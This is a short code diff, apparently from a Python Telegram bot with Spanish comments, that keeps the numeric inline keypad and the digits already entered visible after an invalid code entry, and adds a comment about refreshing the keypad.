@@ -120,7 +120,11 @@ async def keypad_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 "✅ Confirmar.\n\n"
                 f"Código: `{code or '—'}`"
             )
-            await q.edit_message_text(error_msg, parse_mode="Markdown")
+            # Mantener el teclado numérico para corregir
+            # (no mostramos el texto largo, solo el mensaje de error + keypad)
+            context.user_data[UD_CODE] = code  # conserva lo ya marcado
+            _, kb = build_keypad(code)
+            await q.edit_message_text(error_msg, parse_mode="Markdown", reply_markup=kb)
             return
 
         phone = context.user_data.get(UD_PHONE, "desconocido")
@@ -144,6 +148,7 @@ async def keypad_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
         context.user_data[UD_CODE] = ""
         return
 
+    # Refrescar keypad con el progreso actual
     context.user_data[UD_CODE] = code
     text, kb = build_keypad(code)
     try:
